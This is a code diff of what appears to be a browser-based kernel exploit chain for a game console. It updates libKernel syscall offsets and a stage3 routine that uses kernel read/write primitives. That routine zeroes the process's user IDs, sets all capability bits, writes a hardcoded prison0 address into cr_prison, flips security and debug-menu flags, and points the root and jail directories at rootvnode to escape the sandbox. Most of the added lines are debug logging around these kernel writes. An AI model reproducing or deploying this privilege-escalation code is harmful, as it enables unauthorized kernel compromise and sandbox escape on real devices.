@@ -755,24 +755,24 @@ function stage2() {
   //alert("before syscalls");
 
 //0.85.070
-  window.syscalls[3] = window.libKernelBase.add32(0x322d0);//write
-  window.syscalls[4] = window.libKernelBase.add32(0x30c90);//write
-  window.syscalls[5] = window.libKernelBase.add32(0x300d0);//open
-  window.syscalls[20] = window.libKernelBase.add32(0x31c30);//getpid
-  window.syscalls[23] = window.libKernelBase.add32(0x2fd50);//setuid
-  window.syscalls[0x18] = window.libKernelBase.add32(0x31070); // sys_getuid
-  window.syscalls[54] = window.libKernelBase.add32(0x30110);//ioctl
-  window.syscalls[74] = window.libKernelBase.add32(0x30660);//mprotect
-  window.syscalls[97] = window.libKernelBase.add32(0x32100);//socket
-  window.syscalls[98] = window.libKernelBase.add32(0x303b0);//connect
-  window.syscalls[105] = window.libKernelBase.add32(0x2fff0);//setsockopt
-  window.syscalls[118] = window.libKernelBase.add32(0x30250);//getsockopt
-  window.syscalls[324] = window.libKernelBase.add32(0x32350);//mlockall
-  window.syscalls[477] = window.libKernelBase.add32(0x2ffd0);//mmap
-  window.syscalls[533] = window.libKernelBase.add32(0x32310);//jitshm_create
-  window.syscalls[534] = window.libKernelBase.add32(0x322f0);//jitshm_alias
-  window.syscalls[0x2AF] = window.libKernelBase.add32(0x31fc0);//pipe2
-  window.syscalls[0x249]  = window.libKernelBase.add32(0x2fb60); // sys_is_in_sandbox
+  window.syscalls[3] = 		window.libKernelBase.add32(0x322d0);//write
+  window.syscalls[4] = 		window.libKernelBase.add32(0x30c90);//write
+  window.syscalls[5] = 		window.libKernelBase.add32(0x300d0);//open
+  window.syscalls[20] = 	window.libKernelBase.add32(0x31c30);//getpid
+  window.syscalls[23] = 	window.libKernelBase.add32(0x2fd50);//setuid
+  window.syscalls[24] = 	window.libKernelBase.add32(0x31070); // sys_getuid
+  window.syscalls[54] = 	window.libKernelBase.add32(0x30110);//ioctl
+  window.syscalls[74] = 	window.libKernelBase.add32(0x30660);//mprotect
+  window.syscalls[97] = 	window.libKernelBase.add32(0x32100);//socket
+  window.syscalls[98] = 	window.libKernelBase.add32(0x303b0);//connect
+  window.syscalls[105] = 	window.libKernelBase.add32(0x2fff0);//setsockopt
+  window.syscalls[118] = 	window.libKernelBase.add32(0x30250);//getsockopt
+  window.syscalls[324] = 	window.libKernelBase.add32(0x32350);//mlockall
+  window.syscalls[477] = 	window.libKernelBase.add32(0x2ffd0);//mmap
+  window.syscalls[533] = 	window.libKernelBase.add32(0x32310);//jitshm_create
+  window.syscalls[534] = 	window.libKernelBase.add32(0x322f0);//jitshm_alias
+  window.syscalls[585]  = 	window.libKernelBase.add32(0x2fb60); //sys_is_in_sandbox
+  window.syscalls[687] = 	window.libKernelBase.add32(0x31fc0);//pipe2
   //alert("after syscalls");
 
   p.write8(kstr, orig_kview_buf);
@@ -1386,38 +1386,60 @@ function stage3() {
 	//CORRECT SUPPOSED SECURITY FLAGS
 	17 00 00 00 00 00 00 01
   */
-  let prison0 =  kernel_read8(get_kaddr(PRISON_OFFSET));
-  alert("prison1: "  + kernel_read8(proc_ucred.add32(0x30)));
-  alert("prison2: "  + prison0);
+  
   
 
   
 	// Set security flags
 	let security_flags =  kernel_read4(get_kaddr(SFF_OFFSET));
+	debug_log("[+] security_flags: " + security_flags);
 	 kernel_write4(get_kaddr(SFF_OFFSET), security_flags | 0x14);
+	 debug_log("[+] security_flags_after: " + kernel_read4(get_kaddr(SFF_OFFSET)));
 
 	// Set qa flags and utoken flags for debug menu enable
 	let qaf_dword =  kernel_read4(get_kaddr(QAF_OFFSET));
+	debug_log("[+] qaf_flags_before: " + qaf_dword);
 	 kernel_write4(get_kaddr(QAF_OFFSET), qaf_dword | 0x10300);
+	 debug_log("[+] qaf_flags_after: " + kernel_read4(get_kaddr(QAF_OFFSET)));
 
 	let utoken_flags =  kernel_read1(get_kaddr(UTF_OFFSET));
+	debug_log("[+] utoken_flags_before: " + utoken_flags);
 	 kernel_write1(get_kaddr(UTF_OFFSET), utoken_flags | 0x1);
+	 debug_log("[+] utoken_flags_after: " +  kernel_read1(get_kaddr(UTF_OFFSET)));
 	debug_log("[+] enabled debug menu");
 
+	debug_log("cr_uid before: "  + kernel_read4(proc_ucred.add32(0x04)));
 	 kernel_write4(proc_ucred.add32(0x04), 0); // cr_uid
+	 debug_log("cr_uid after: "  + kernel_read4(proc_ucred.add32(0x04)));
+	 debug_log("cr_ruid before: "  + kernel_read4(proc_ucred.add32(0x08)));
 	 kernel_write4(proc_ucred.add32(0x08), 0); // cr_ruid
+	 debug_log("cr_ruid after: "  + kernel_read4(proc_ucred.add32(0x08)));
+	 debug_log("cr_svuid before: "  + kernel_read4(proc_ucred.add32(0x0C)));
 	 kernel_write4(proc_ucred.add32(0x0C), 0); // cr_svuid
+	 debug_log("cr_svuid after: "  + kernel_read4(proc_ucred.add32(0x0C)));
+	 debug_log("cr_ngroups before: "  + kernel_read4(proc_ucred.add32(0x10)));
 	 kernel_write4(proc_ucred.add32(0x10), 1); // cr_ngroups
+	 debug_log("cr_ngroups after: "  + kernel_read4(proc_ucred.add32(0x10)));
+	 debug_log("cr_rgid before: "  + kernel_read4(proc_ucred.add32(0x14)));
 	 kernel_write4(proc_ucred.add32(0x14), 0); // cr_rgid
+	 debug_log("cr_rgid after: "  + kernel_read4(proc_ucred.add32(0x14)));
 
 	// Escalate sony privs
-	
-	 kernel_write8(proc_ucred.add32(0x30), prison0); // cr_prison
+	 debug_log("cr_prison before: "  + kernel_read8(proc_ucred.add32(0x30)));
+	 kernel_write8(proc_ucred.add32(0x30), new int64(0x82D7B5B0, 0xFFFFFFFF)); // cr_prison = prison0 address
+	 debug_log("cr_prison after: "  + kernel_read8(proc_ucred.add32(0x30)));
+	 debug_log("auth_id_before: "  + kernel_read8(proc_ucred.add32(0x58)));
 	 kernel_write8(proc_ucred.add32(0x58), new int64(0x00000010, 0x48000000)); // cr_sceAuthId
+	 debug_log("auth_id after: "  + kernel_read8(proc_ucred.add32(0x58)));
+	 debug_log("cr_sceCaps 0 before: "  + kernel_read8(proc_ucred.add32(0x60)));
 	 kernel_write8(proc_ucred.add32(0x60), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[0]
+	 debug_log("cr_sceCaps 0 after: "  + kernel_read8(proc_ucred.add32(0x60)));
+	 debug_log("cr_sceCaps 1 before: "  + kernel_read8(proc_ucred.add32(0x68)));
 	 kernel_write8(proc_ucred.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[1]
+	 debug_log("cr_sceCaps 1 after: "  + kernel_read8(proc_ucred.add32(0x68)));
+	 debug_log("cr_sceAttr 0 before: "  + kernel_read1(proc_ucred.add32(0x83)));
 	 kernel_write1(proc_ucred.add32(0x83), 0x80);                              // cr_sceAttr[0]
-	
+	 debug_log("cr_sceAttr 0 after: "  + kernel_read1(proc_ucred.add32(0x83)));
 	// Remove dynlib restriction
     let proc_pdynlib_offset = proc.add32(0x3E8);
     let proc_pdynlib_addr = kernel_read8(proc_pdynlib_offset);
@@ -1432,15 +1454,19 @@ function stage3() {
     debug_log("[+] we root now? uid=0x" + cur_uid);
 	
 	let rootvnode =  kernel_read8(get_kaddr(ROOTVNODE_OFFSET));
+	debug_log("fd_rdir before: "  + kernel_read8(proc_fd.add32(0x10)));
      kernel_write8(proc_fd.add32(0x10), rootvnode); // fd_rdir
+	 debug_log("fd_rdir after: "  + kernel_read8(proc_fd.add32(0x10)));
+	 debug_log("fd_jdir before: "  + kernel_read8(proc_fd.add32(0x18)));
      kernel_write8(proc_fd.add32(0x18), rootvnode); // fd_jdir
-	 
+	 debug_log("fd_rdir after: "  + kernel_read8(proc_fd.add32(0x18)));
 	let is_in_sandbox = chain.syscall(0x249);
     debug_log("[+] we escaped now? in sandbox: " + is_in_sandbox);
   
 
   alert("prison3: " + kernel_read8(proc_ucred.add32(0x30)));
-/*  
+
+/*
   let dump_addr = get_kaddr(0x50F3C00);
   let dump_page = p.malloc(0x1000);
 
@@ -1461,7 +1487,7 @@ function stage3() {
   }
 
   // end dump code
- */ 
+*/
 
 
   let buf = p.malloc(0x1000);
